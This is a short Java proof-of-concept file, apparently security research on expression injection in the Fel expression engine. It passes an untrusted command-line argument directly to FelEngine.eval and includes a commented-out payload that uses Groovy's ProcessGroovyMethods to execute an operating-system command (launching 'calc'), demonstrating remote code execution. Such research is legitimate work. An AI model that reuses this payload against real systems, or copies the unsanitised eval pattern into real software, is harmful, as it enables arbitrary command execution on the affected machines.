package com.SugarP1g.felInjection;

import com.greenpineyu.fel.FelEngine;
import com.greenpineyu.fel.FelEngineImpl;

public class POC {
    public static void main(String[] args) throws Exception {

        String exp = args[1];
        // String exp = "$(\"org.codehaus.groovy.runtime.ProcessGroovyMethods\").execute(\"calc\")";
        insecureFelCall(exp);
    }

    private static void insecureFelCall(String exp) {
        FelEngine fel = new FelEngineImpl();
        Object result = fel.eval(exp);
        System.out.println(result);
    }
}
